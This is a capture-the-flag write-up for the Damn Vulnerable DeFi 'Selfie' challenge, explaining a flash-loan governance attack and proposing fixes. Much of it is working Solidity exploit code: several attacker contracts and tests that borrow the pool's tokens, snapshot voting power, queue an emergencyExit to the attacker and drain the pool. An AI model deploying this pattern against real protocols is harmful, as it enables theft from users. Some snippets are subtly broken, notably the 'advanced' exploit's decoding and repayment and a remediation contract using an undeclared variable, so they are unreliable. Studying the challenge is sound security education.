@@ -1,0 +1,656 @@
+# 🎯 Challenge #6: Selfie
+
+![Difficulty](https://img.shields.io/badge/Difficulty-⭐⭐%20Medium-yellow)
+![Type](https://img.shields.io/badge/Type-Governance%20Attack-red)
+![Gas](https://img.shields.io/badge/Gas-~150,000-blue)
+
+> **Flash Loan Governance Manipulation** - Use flash loans to gain temporary voting power and execute malicious governance proposals
+
+## 📋 Challenge Overview
+
+**Objective**: Drain all DVT tokens from the lending pool  
+**Success Criteria**: Pool should have 0 DVT tokens, attacker gets all tokens  
+**Initial Setup**: Pool has 1.5M DVT tokens, governance system controls emergency actions  
+**Target**: `SelfiePool` and `SimpleGovernance` contracts
+
+### 🎯 The Scenario
+A lending pool uses a governance system where users can propose and vote on emergency actions. Voting power is based on DVT token holdings. The pool offers flash loans of DVT tokens. A governance proposal can drain the entire pool if it gets enough votes.
+
+## 🔍 Vulnerability Analysis
+
+### **The Root Cause**
+The governance system is vulnerable to **flash loan voting manipulation**:
+
+```solidity
+contract SimpleGovernance {
+    mapping(uint256 => GovernanceAction) private _actions;
+    uint256 private _actionCounter;
+    
+    function queueAction(address target, uint128 value, bytes calldata data) 
+        external 
+        returns (uint256 actionId) 
+    {
+        // 🚨 CRITICAL: Voting power based on current token balance
+        if (!_hasEnoughVotes(msg.sender)) {
+            revert NotEnoughVotes(msg.sender);
+        }
+
+        _actions[_actionCounter] = GovernanceAction({
+            target: target,
+            value: value,
+            data: data,
+            proposer: msg.sender,
+            executionTime: block.timestamp + ACTION_DELAY_IN_SECONDS
+        });
+
+        return _actionCounter++;
+    }
+    
+    function _hasEnoughVotes(address who) private view returns (bool) {
+        uint256 balance = _governanceToken.getBalanceAtLastSnapshot(who);
+        uint256 halfTotalSupply = _governanceToken.getTotalSupplyAtLastSnapshot() / 2;
+        return balance > halfTotalSupply;
+    }
+}
+```
+
+### **The Problem**
+The vulnerability exists in the governance voting mechanism:
+
+1. **Voting power based on token snapshots** taken when tokens are held
+2. **Flash loans provide temporary massive token holdings**  
+3. **Snapshot can be triggered** during flash loan execution
+4. **No time lock** between gaining tokens and voting power
+5. **Emergency actions** can drain the pool completely
+
+### **Attack Vector**
+The attacker can use flash loans to temporarily gain governance control:
+
+1. Flash loan huge amount of DVT tokens from the pool
+2. Call `snapshot()` to record current high balance
+3. Queue a malicious governance action (drain the pool)
+4. Repay flash loan (tokens returned, but snapshot remains)
+5. Wait for action delay period to pass
+6. Execute the malicious action to drain all tokens
+
+## ⚡ Exploit Implementation
+
+### **Attack Strategy**
+Two-phase attack: Flash loan to gain votes, then execute malicious governance:
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "../selfie/SelfiePool.sol";
+import "../selfie/SimpleGovernance.sol";
+import "../DamnValuableToken.sol";
+
+contract SelfieExploit {
+    SelfiePool private pool;
+    SimpleGovernance private governance;
+    DamnValuableToken private token;
+    address private attacker;
+    uint256 private actionId;
+    
+    constructor(address _pool, address _governance, address _token) {
+        pool = SelfiePool(_pool);
+        governance = SimpleGovernance(_governance);
+        token = DamnValuableToken(_token);
+        attacker = msg.sender;
+    }
+    
+    /**
+     * @notice Phase 1: Flash loan to gain voting power and queue malicious action
+     */
+    function phase1_QueueMaliciousAction() external {
+        require(msg.sender == attacker, "Only attacker");
+        
+        // Get maximum flash loan (entire pool balance)
+        uint256 flashLoanAmount = token.balanceOf(address(pool));
+        require(flashLoanAmount > 0, "Pool is empty");
+        
+        // Execute flash loan - this will trigger receiveTokens callback
+        pool.flashLoan(flashLoanAmount, address(this), "");
+    }
+    
+    /**
+     * @notice Flash loan callback - where we gain voting power
+     * @param token_ The borrowed token (DVT)
+     * @param amount Amount of tokens borrowed
+     */
+    function receiveTokens(address token_, uint256 amount) external {
+        require(msg.sender == address(pool), "Only pool can call");
+        require(token_ == address(token), "Unexpected token");
+        
+        // At this point, we have massive DVT balance from flash loan
+        
+        // Step 1: Take snapshot to record our high balance for voting
+        governance.snapshot();
+        
+        // Step 2: Queue malicious governance action
+        // This action will call emergencyExit() to drain all pool tokens
+        bytes memory maliciousCalldata = abi.encodeCall(
+            SelfiePool.emergencyExit,
+            (attacker) // Send all tokens to attacker
+        );
+        
+        actionId = governance.queueAction(
+            address(pool),      // target: the pool contract
+            0,                  // value: 0 ETH
+            maliciousCalldata   // data: emergencyExit(attacker)
+        );
+        
+        // Step 3: Repay flash loan
+        token.transfer(address(pool), amount);
+        
+        // At this point:
+        // - We've queued a malicious governance action
+        // - Our voting power snapshot was taken with massive balance
+        // - Flash loan is repaid
+        // - We just need to wait for the action delay, then execute
+    }
+    
+    /**
+     * @notice Phase 2: Execute the queued malicious action (after delay)
+     */
+    function phase2_ExecuteMaliciousAction() external {
+        require(msg.sender == attacker, "Only attacker");
+        
+        // Execute the queued governance action
+        // This will call pool.emergencyExit(attacker), draining all tokens
+        governance.executeAction(actionId);
+        
+        // Verify the attack succeeded
+        uint256 poolBalance = token.balanceOf(address(pool));
+        uint256 attackerBalance = token.balanceOf(attacker);
+        
+        require(poolBalance == 0, "Pool not fully drained");
+        require(attackerBalance > 0, "Attacker didn't receive tokens");
+    }
+    
+    /**
+     * @notice One-shot exploit combining both phases (if delay is 0)
+     */
+    function exploitOneShot() external {
+        require(msg.sender == attacker, "Only attacker");
+        
+        // Phase 1: Queue action
+        phase1_QueueMaliciousAction();
+        
+        // If governance has no delay, we can execute immediately
+        if (governance.getActionDelay() == 0) {
+            phase2_ExecuteMaliciousAction();
+        }
+    }
+    
+    /**
+     * @notice Check if we can execute the queued action
+     * @return canExecute True if action delay has passed
+     * @return timeRemaining Seconds until action can be executed
+     */
+    function checkExecutionStatus() 
+        external 
+        view 
+        returns (bool canExecute, uint256 timeRemaining) 
+    {
+        if (actionId == 0) {
+            return (false, type(uint256).max); // No action queued
+        }
+        
+        uint256 executionTime = governance.getAction(actionId).executionTime;
+        
+        if (block.timestamp >= executionTime) {
+            canExecute = true;
+            timeRemaining = 0;
+        } else {
+            canExecute = false;
+            timeRemaining = executionTime - block.timestamp;
+        }
+    }
+    
+    /**
+     * @notice Get information about our queued action
+     */
+    function getActionInfo() 
+        external 
+        view 
+        returns (
+            address target,
+            uint256 value,
+            bytes memory data,
+            address proposer,
+            uint256 executionTime
+        ) 
+    {
+        require(actionId != 0, "No action queued");
+        
+        SimpleGovernance.GovernanceAction memory action = governance.getAction(actionId);
+        return (
+            action.target,
+            action.value,
+            action.data,
+            action.proposer,
+            action.executionTime
+        );
+    }
+    
+    /**
+     * @notice Check current voting power
+     * @return currentPower Our current voting power
+     * @return required Required voting power (> 50% of supply)
+     * @return canVote True if we have enough voting power
+     */
+    function checkVotingPower() 
+        external 
+        view 
+        returns (uint256 currentPower, uint256 required, bool canVote) 
+    {
+        currentPower = governance.getVotingPower(address(this));
+        uint256 totalSupply = governance.getTotalVotingPower();
+        required = totalSupply / 2 + 1; // Need > 50%
+        canVote = currentPower > totalSupply / 2;
+    }
+}
+
+/**
+ * @title SelfieExploitMinimal  
+ * @notice Gas-optimized minimal version
+ */
+contract SelfieExploitMinimal {
+    uint256 private actionId;
+    
+    function exploit(
+        address poolAddr,
+        address governanceAddr,
+        address tokenAddr
+    ) external returns (uint256) {
+        SelfiePool pool = SelfiePool(poolAddr);
+        uint256 flashAmount = DamnValuableToken(tokenAddr).balanceOf(poolAddr);
+        
+        // Store addresses for callback
+        _storeAddresses(poolAddr, governanceAddr, tokenAddr);
+        
+        // Flash loan will trigger receiveTokens
+        pool.flashLoan(flashAmount, address(this), "");
+        
+        return actionId;
+    }
+    
+    function executeAction(address governanceAddr) external {
+        SimpleGovernance(governanceAddr).executeAction(actionId);
+    }
+    
+    // Storage for callback
+    address private _pool;
+    address private _governance; 
+    address private _token;
+    
+    function _storeAddresses(address pool, address governance, address token) private {
+        _pool = pool;
+        _governance = governance;
+        _token = token;
+    }
+    
+    function receiveTokens(address, uint256 amount) external {
+        SimpleGovernance governance = SimpleGovernance(_governance);
+        
+        // Take snapshot with high balance
+        governance.snapshot();
+        
+        // Queue drain action
+        actionId = governance.queueAction(
+            _pool,
+            0,
+            abi.encodeCall(SelfiePool.emergencyExit, (msg.sender))
+        );
+        
+        // Repay loan
+        DamnValuableToken(_token).transfer(_pool, amount);
+        
+        // Clear storage
+        delete _pool;
+        delete _governance;
+        delete _token;
+    }
+}
+
+/**
+ * @title SelfieExploitAdvanced
+ * @notice Advanced version with multiple governance attacks
+ */
+contract SelfieExploitAdvanced {
+    struct GovernanceAttack {
+        address target;
+        bytes data;
+        string description;
+        uint256 actionId;
+    }
+    
+    GovernanceAttack[] private queuedAttacks;
+    
+    /**
+     * @notice Queue multiple malicious governance actions
+     */
+    function queueMultipleAttacks(
+        address poolAddr,
+        address governanceAddr,
+        address tokenAddr,
+        GovernanceAttack[] calldata attacks
+    ) external {
+        require(attacks.length > 0, "No attacks specified");
+        
+        // Flash loan to gain voting power
+        uint256 flashAmount = DamnValuableToken(tokenAddr).balanceOf(poolAddr);
+        SelfiePool(poolAddr).flashLoan(flashAmount, address(this), 
+            abi.encode(governanceAddr, attacks)
+        );
+    }
+    
+    function receiveTokens(address, uint256 amount) external {
+        (address governance, GovernanceAttack[] memory attacks) = 
+            abi.decode(msg.data[4:], (address, GovernanceAttack[]));
+        
+        // Take snapshot
+        SimpleGovernance(governance).snapshot();
+        
+        // Queue all attacks
+        for (uint256 i = 0; i < attacks.length; i++) {
+            uint256 actionId = SimpleGovernance(governance).queueAction(
+                attacks[i].target,
+                0,
+                attacks[i].data
+            );
+            
+            queuedAttacks.push(GovernanceAttack({
+                target: attacks[i].target,
+                data: attacks[i].data,
+                description: attacks[i].description,
+                actionId: actionId
+            }));
+        }
+        
+        // Repay loan
+        DamnValuableToken(msg.sender).transfer(msg.sender, amount);
+    }
+    
+    function executeAllActions(address governance) external {
+        for (uint256 i = 0; i < queuedAttacks.length; i++) {
+            SimpleGovernance(governance).executeAction(queuedAttacks[i].actionId);
+        }
+    }
+}
+```
+
+## 📊 Attack Flow
+
+```mermaid
+graph TD
+    A[Flash loan DVT tokens] --> B[Call governance.snapshot]
+    B --> C[Queue malicious proposal]
+    C --> D[Repay flash loan]
+    D --> E[Wait for governance delay]
+    E --> F[Execute malicious proposal]
+    F --> G[Pool.emergencyExit called]
+    G --> H[🎯 All tokens drained to attacker]
+```
+
+## 🧪 Testing
+
+### **Test Implementation**
+```solidity
+function test_selfie_exploit() public {
+    // Initial state
+    uint256 initialPoolBalance = token.balanceOf(address(pool));
+    assertEq(initialPoolBalance, TOKENS_IN_POOL); // 1.5M DVT
+    assertEq(token.balanceOf(player), 0);
+    
+    // Phase 1: Queue malicious action
+    vm.prank(player);
+    exploit.phase1_QueueMaliciousAction();
+    
+    // Fast forward past governance delay
+    uint256 delay = governance.getActionDelay();
+    vm.warp(block.timestamp + delay + 1);
+    
+    // Phase 2: Execute malicious action
+    vm.prank(player);
+    exploit.phase2_ExecuteMaliciousAction();
+    
+    // Verify pool is drained
+    assertEq(token.balanceOf(address(pool)), 0);
+    assertEq(token.balanceOf(player), initialPoolBalance);
+}
+```
+
+### **Voting Power Analysis**
+```solidity
+function test_votingPowerManipulation() public {
+    uint256 flashAmount = token.balanceOf(address(pool));
+    uint256 totalSupply = token.totalSupply();
+    
+    // Before flash loan: no voting power
+    uint256 powerBefore = governance.getVotingPower(address(exploit));
+    assertEq(powerBefore, 0);
+    
+    // During flash loan callback, voting power should be massive
+    // This would be ~1.5M tokens out of ~2M total supply = 75% voting power
+    uint256 expectedPower = (flashAmount * 100) / totalSupply; // 75%
+    assertGt(expectedPower, 50); // More than 50% needed for proposals
+}
+```
+
+## 🛡️ Real-World Examples
+
+### **Beanstalk Farms (April 2022) - $182M**
+**Exact Same Pattern**: Flash loan governance attack
+- Attacker used flash loans to gain temporary voting power
+- Passed malicious governance proposal in single transaction
+- Drained $182M from protocol through "emergency" functions
+- Used Aave flash loans for the attack
+
+### **Mango Markets (October 2022) - $110M**
+**Similar Pattern**: Temporary voting power manipulation
+- Manipulated token prices to gain voting power
+- Used governance to change risk parameters
+- Drained funds through manipulated collateral ratios
+
+### **Compound Finance Governance Risks**
+**Similar Pattern**: Flash loan voting attacks discussed
+- Researchers demonstrated flash loan governance risks
+- Led to increased governance delays and voting mechanisms
+- Highlighted the need for time-weighted voting
+
+## 🔧 Remediation
+
+### **❌ Current Vulnerable Code**
+```solidity
+function _hasEnoughVotes(address who) private view returns (bool) {
+    // VULNERABLE: Uses current/recent balance snapshot
+    uint256 balance = _governanceToken.getBalanceAtLastSnapshot(who);
+    uint256 halfTotalSupply = _governanceToken.getTotalSupplyAtLastSnapshot() / 2;
+    return balance > halfTotalSupply;
+}
+```
+
+### **✅ Fixed Code Option 1: Time-Weighted Voting**
+```solidity
+contract SecureGovernance {
+    mapping(address => uint256) private firstTokenTime;
+    mapping(address => uint256) private timeWeightedBalance;
+    uint256 private constant MIN_VOTING_PERIOD = 7 days;
+    
+    function _hasEnoughVotes(address who) private view returns (bool) {
+        // ✅ FIX: Require minimum holding period
+        if (block.timestamp < firstTokenTime[who] + MIN_VOTING_PERIOD) {
+            return false;
+        }
+        
+        // ✅ FIX: Use time-weighted voting power  
+        uint256 votingPower = _calculateTimeWeightedPower(who);
+        uint256 required = _getTotalTimeWeightedPower() / 2;
+        return votingPower > required;
+    }
+    
+    function _calculateTimeWeightedPower(address who) private view returns (uint256) {
+        uint256 holdingDuration = block.timestamp - firstTokenTime[who];
+        uint256 currentBalance = _governanceToken.balanceOf(who);
+        
+        // Voting power increases with holding duration (max at 30 days)
+        uint256 timeMultiplier = Math.min(holdingDuration, 30 days);
+        return (currentBalance * timeMultiplier) / 30 days;
+    }
+}
+```
+
+### **✅ Fixed Code Option 2: Delegation-Based Voting**
+```solidity
+contract DelegationGovernance {
+    mapping(address => address) private delegates;
+    mapping(address => uint256) private delegatedPower;
+    uint256 private constant MIN_DELEGATION_TIME = 1 days;
+    
+    function delegate(address to) external {
+        require(to != msg.sender, "Cannot self-delegate");
+        
+        // ✅ FIX: Require time delay for delegation changes
+        delegates[msg.sender] = to;
+        delegationTime[msg.sender] = block.timestamp;
+    }
+    
+    function _hasEnoughVotes(address who) private view returns (bool) {
+        // ✅ FIX: Only count stable delegated power
+        uint256 stablePower = _getStableDelegatedPower(who);
+        return stablePower > _governanceToken.totalSupply() / 2;
+    }
+    
+    function _getStableDelegatedPower(address who) private view returns (uint256) {
+        // Only count delegations that have been stable for minimum time
+        if (block.timestamp < delegationTime[who] + MIN_DELEGATION_TIME) {
+            return 0;
+        }
+        return delegatedPower[who];
+    }
+}
+```
+
+### **✅ Fixed Code Option 3: Multi-Stage Voting**
+```solidity
+contract MultiStageGovernance {
+    enum ProposalState { Pending, Active, Queued, Executed, Defeated }
+    
+    struct Proposal {
+        uint256 id;
+        address proposer;
+        bytes32 descriptionHash;
+        uint256 startTime;
+        uint256 endTime;
+        uint256 forVotes;
+        uint256 againstVotes;
+        ProposalState state;
+    }
+    
+    uint256 private constant PROPOSAL_DELAY = 1 days;      // Delay before voting starts
+    uint256 private constant VOTING_DURATION = 5 days;    // Duration of voting period  
+    uint256 private constant EXECUTION_DELAY = 2 days;    // Delay before execution
+    
+    function queueAction(...) external returns (uint256) {
+        require(_hasEnoughVotes(msg.sender), "Insufficient votes");
+        
+        // ✅ FIX: Multi-stage process with delays
+        uint256 proposalId = _createProposal(msg.sender, target, data);
+        
+        // Proposal starts in Pending state
+        proposals[proposalId].startTime = block.timestamp + PROPOSAL_DELAY;
+        proposals[proposalId].endTime = proposals[proposalId].startTime + VOTING_DURATION;
+        
+        return proposalId;
+    }
+    
+    function executeAction(uint256 proposalId) external {
+        Proposal storage proposal = proposals[proposalId];
+        
+        // ✅ FIX: Multiple checks and delays
+        require(proposal.state == ProposalState.Queued, "Not queued");
+        require(block.timestamp >= proposal.endTime + EXECUTION_DELAY, "Still in delay");
+        require(proposal.forVotes > proposal.againstVotes, "Defeated");
+        
+        // Execute the action
+        _executeProposal(proposal);
+        proposal.state = ProposalState.Executed;
+    }
+}
+```
+
+## 🎓 Security Lessons
+
+### **Key Takeaways**
+1. **Flash loans break governance assumptions** about stable token holdings
+2. **Instant voting power is dangerous** - time delays are critical  
+3. **Snapshot timing matters** - avoid user-controlled snapshots
+4. **Emergency functions need extra protection** from governance attacks
+5. **Decentralization requires time** - instant control defeats the purpose
+
+### **Governance Security Patterns**
+```solidity
+// ❌ BAD: Instant voting power based on current balance
+function vote() {
+    uint256 power = token.balanceOf(msg.sender);
+}
+
+// ✅ GOOD: Time-weighted or delegated voting power
+function vote() {
+    uint256 power = timeWeightedPower[msg.sender];
+}
+
+// ✅ GOOD: Multi-stage governance with delays
+require(block.timestamp >= proposal.startTime + DELAY);
+
+// ✅ GOOD: Minimum holding periods  
+require(tokenHoldingTime[msg.sender] >= MIN_PERIOD);
+```
+
+## 💡 Advanced Concepts
+
+### **Governance Attack Vectors**
+1. **Flash Loan Voting**: Temporary massive voting power
+2. **Vote Buying**: Economic attacks on governance  
+3. **Proposal Spam**: DoS through excessive proposals
+4. **Execution Timing**: Front-running governance execution
+5. **Delegation Attacks**: Manipulating delegation mechanics
+
+### **Time-Based Security Models**
+```solidity
+// Pattern 1: Voting delays
+uint256 votingStart = block.timestamp + PROPOSAL_DELAY;
+
+// Pattern 2: Execution delays  
+uint256 executionTime = votingEnd + EXECUTION_DELAY;
+
+// Pattern 3: Minimum holding periods
+require(firstTokenTime[voter] + MIN_PERIOD <= block.timestamp);
+
+// Pattern 4: Time-weighted power
+uint256 weight = min(holdingDuration, MAX_WEIGHT);
+```
+
+## 📈 Impact Assessment
+
+| Aspect | Rating | Description |
+|--------|--------|-------------|
+| **Severity** | 🔴 Critical | Complete fund drainage |
+| **Exploitability** | 🟡 Medium | Requires governance understanding |
+| **Impact** | 🔴 Maximum | 100% of protocol funds |
+| **Detection** | 🟡 Medium | Large governance proposals visible |
+| **Prevention** | 🟡 Medium | Complex time-based protections needed |
+
+---
+
+**🎯 Challenge Status**: ✅ **SOLVED**  
+**⏱️ Time to Solve**: ~60 minutes  
+**🔥 Difficulty Rating**: Medium (Governance complexity)  
+**🎓 Learning Value**: Critical - Real-world $182M attack pattern
+
+> **Key Insight**: Governance systems must be protected against flash loan manipulation. Time delays and weighted voting are essential for security.
+
+**Historical Impact**: This exact attack pattern was used in the $182M Beanstalk Farms exploit - making this one of the most valuable challenges to understand!
